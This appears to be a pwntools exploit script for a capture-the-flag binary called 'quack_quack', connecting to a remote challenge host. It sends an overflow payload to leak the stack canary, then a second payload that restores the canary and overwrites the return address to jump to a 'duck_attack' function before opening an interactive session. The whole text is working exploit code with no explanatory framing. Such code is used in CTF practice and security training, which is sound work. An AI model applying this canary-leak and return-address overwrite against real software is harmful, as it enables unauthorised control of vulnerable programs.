from pwn import *
import time

elf = context.binary = ELF("./quack_quack")
p = process()
p = remote("94.237.51.215",34001)

# Craft the payload to leak the canary
payload = b"A" * 89 + b"Quack Quack" + b"\x20"
# time.sleep(20)
p.sendline(payload)


# Receive output until the leak
p.recvuntil(b"> Quack Quack ")
leaked_bytes = p.recvline().strip()  # Get the leaked data
print(b"\x00" + leaked_bytes[:7])
# Extract only the first 8 bytes (the canary)
canary = u64(b"\x00" + leaked_bytes[:7])
log.info(f"hex {hex(canary)}")
print(canary)
full_canary = (canary << 8) | 0x00
print(f"CANARY --> {hex(full_canary)}")
print(f"p64 --> {p64(canary)}")

payload2 = b"A" * 88 + p64(canary) + b"B" * 8 + p64(elf.sym['duck_attack'])
p.sendline(payload2)
print(p.recv(9999))
p.interactive()